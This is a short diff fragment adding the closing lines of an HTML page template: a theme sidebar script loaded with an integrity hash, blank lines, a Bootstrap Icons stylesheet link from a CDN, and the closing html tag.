+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
